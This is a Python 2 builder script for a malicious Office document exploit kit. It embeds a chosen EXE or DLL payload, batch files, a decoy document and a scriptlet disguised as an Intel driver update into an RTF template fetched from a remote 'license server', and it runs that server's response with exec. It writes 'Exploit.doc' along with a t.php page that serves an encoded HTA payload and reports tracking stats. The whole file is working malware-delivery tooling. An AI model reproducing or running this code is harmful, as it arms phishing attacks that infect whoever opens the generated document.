from random import *
import base64
import sys
import struct
import binascii
import os
import re
import base64
import hashlib
import httplib, urllib
from urlparse import urlparse
import packager



thread=str(0)
if len(sys.argv)>5:
	thread=sys.argv[5]

def WriteFile(filename,data):
	with open(filename,"wb") as output:
		output.write(data)		

def FindExeOffset(path):
	filename = path
	with open(filename, "rb") as f:
		f1 = re.search(b'\xBA\xBA\xBA\xBA\xBA\xBA\xBA', f.read())
	offset=f1 .start()+7
	return offset

def FindDecoyOffset(path):
	filename = path
	with open(filename, "rb") as f:
		f1 = re.search(b'\xBB\xBB\xBB\xBB\xBB\xBB\xBB', f.read())
	offset=f1 .start()+7
	return offset	
			
def FindSize(path):
	info = os.stat(path)
	size = info.st_size-1
	return size
			
def AddNewThread(thost,turl):
	headers = {"Content-type": "application/x-www-form-urlencoded",
            "Accept": "text/plain"}
	values = {
	'action' : 'addthread',
	'thread' : thread,
	'decoystart' : str(123),
	'decoyend' : str(123),
	'exestart' : str(123),
	'exeend' : str(123)
}
	values = urllib.urlencode(values)
	conn = httplib.HTTPConnection(thost)
	conn.request("POST", turl, values, headers)
	response = conn.getresponse()
	data = response.read()
	if (response.status==200):
		print data
	else:
		print 'Unable to connect to t.php. Please upload file to server!'
	
#====================================================READ EXE, DECOY AND IMAGE TO BUILD=================================================I	



#IMAGE FILE
filename = sys.argv[3]
imagesize = FindSize(sys.argv[3])
with open(filename, 'rb') as img:
	imagecont = img.read()
print "\r\nImage file: " + filename	
imgagehex=imagecont
extension = os.path.splitext(filename)[1][1:]


typeofpayload='EXE'
	
#DECOY FILE	
filename = sys.argv[2]
with open(filename, 'rb') as doc:
	doccont = doc.read()
print "Decoy file: " + filename	+ "\r\n"
#=======================================================================================================================================I




#=====================================READ KEYFILE AND COMMUNICATE WITH SERVER TO RECEIVE RTF TEMPLATE==================================I
#READ KEY FILE
keyname = "key.txt"
with open(keyname, 'rb') as key:
	exec(base64.b64decode(key.read()))

if typeofpayload == 'DLL':
	typeofexp=typeofexp+typeofpayload
	
#GENERATE SERVER REQUEST
headers = {"Content-type": "application/x-www-form-urlencoded",
            "Accept": "text/plain"}

values = {
  'userid' : userid,
  'turl' : sys.argv[4],
  'type' : typeofexp,
  'thread' : thread
}

values = urllib.urlencode(values)

#DETERMINE TYPE OF REQUEST HTTP/HTTPS
if (type=='https'):
	conn = httplib.HTTPSConnection(host)
else:
	conn = httplib.HTTPConnection(host)

#SEND SERVER REQUEST	
conn.request("POST", url, values, headers)
response = conn.getresponse()
data = response.read()
if (response.status==200):
	exec(data)
else:
	print 'Unable to connect to license server.\r\nPlease check your Internet connection!'

template=base64.b64decode(template)	
htafile=base64.b64decode(htafile)	
phpfile=base64.b64decode(phpfile)

	




#==========================FLASH EXE, DECOY AND IMAGE TO RECEIVED RTF TEMPLATE AND WRITE READY EXPLOIT FILE=============================I
#FLASH IMAGE TYPE IN RTF TEMPLATE REGARDING IMAGE EXTENSION
if extension.upper() == 'PNG':
	template=template.replace('pict\pngblip', 'pict\pngblip')
	
if extension.upper() == 'JPG':
	template=template.replace('pict\pngblip', 'pict\jpegblip')
		
if extension.upper() == 'JPEG':
	template=template.replace('pict\pngblip', 'pict\jpegblip')
	
if extension.upper() == 'EMF':
	template=template.replace('pict\pngblip', 'pict\emfblip')
	
#FLASH IMAGE CONTENT AND STATSURL IN RTF TEMPLATE	
template = template.replace('IMAGEHEX',imagecont.encode('hex'))
template = template.replace('STATSURL',sys.argv[4]+"?thread="+thread+"&stats=send")

#GEN PACKAGER DATA AND FLASH IT IN RTF TEMPLATE
first_batcont=packager.get_package_bytes("commands/task.bat","TasK.BaT");
decoycont=packager.get_package_bytes("decoy.doc","decoy.doc");

payloadtype = os.path.splitext(sys.argv[1])[1][1:]
if payloadtype.upper() == 'EXE':
	second_batcont=packager.get_package_bytes("commands/exe.bat","2nd.bat");
	executable=packager.get_package_bytes(sys.argv[1],"exe.exe");
	
if payloadtype.upper() == 'DLL':
	second_batcont=packager.get_package_bytes("commands/dll.bat","2nd.bat");
	executable=packager.get_package_bytes(sys.argv[1],"dll.dll");



scriptlet=packager.get_package_bytes("commands/scriptlet.sct","iNteldriVerupd1.sCt");


template = template.replace('EXTCUTABLEHEX',executable)
template = template.replace('DECOYHEX',decoycont)
template = template.replace('BATHEX',first_batcont)
template = template.replace('2NDBAT',second_batcont)
template = template.replace('SCRIPTLET',scriptlet)



#WRITE READY EXPLOIT FILE
WriteFile('ready_exploit/Exploit.doc',template)
#=======================================================================================================================================I









#==============================================FLASH T.PHP FILE WITH DECOY AND EXE OFFESTS==============================================I

#CONNECT TO T.PHP AND ADD NEW THREAD OFFSETS
tphpurl=urlparse(sys.argv[4])
AddNewThread(tphpurl.netloc,tphpurl.path)

#BASE64 ENCODE HTA FILE
payloadbase64=base64.b64encode(htafile)

#FLASH ENCODED HTA FILE IN PHP FILE 
phpfilefixed=phpfile.replace('PAYLOADFILE',payloadbase64)

phpfilefixed=phpfilefixed.replace('EXE_START_DEFAULT',str(123))
phpfilefixed=phpfilefixed.replace('EXE_END_DEFAULT',str(123))
phpfilefixed=phpfilefixed.replace('DECOY_START_DEFAULT',str(123))
phpfilefixed=phpfilefixed.replace('DECOY_END_DEFAULT',str(123))

#WRITE T.PHP FILE		
WriteFile('ready_exploit/web/t.php',phpfilefixed)
callback()



#=======================================================================================================================================I		

		
			
		

print "\r\nDone. DOC file generated successfully!"